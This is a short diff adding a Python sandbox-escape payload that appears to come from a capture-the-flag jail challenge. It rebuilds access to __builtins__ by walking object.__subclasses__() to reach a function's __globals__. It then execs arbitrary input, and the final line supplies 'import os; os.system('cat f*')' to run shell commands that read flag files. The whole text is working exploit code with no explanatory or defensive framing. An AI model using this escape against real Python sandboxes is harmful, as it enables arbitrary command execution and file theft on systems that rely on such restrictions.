@@ -1,0 +1,9 @@
+__getattribute__={}
+__getattribute__['g']=None.__getattribute__('__class__').__getattribute__
+__getattribute__['t']=__getattribute__['g']((),'__class__')
+__getattribute__['o']=__getattribute__['g'](__getattribute__['t'],'__mro__')[-1]
+__getattribute__['wp']=__getattribute__['g'](__getattribute__['o'],'__subclasses__')()[132]
+__getattribute__['i']=__getattribute__['g'](__getattribute__['wp'],'__init__')
+__getattribute__['b']=__getattribute__['g'](__getattribute__['i'],'__globals__')['__builtins__']
+__getattribute__['b']['exec'](__getattribute__['b']['input'](), {'__builtins__':__getattribute__['b']})
+NNNimport os; os.system('cat f*')
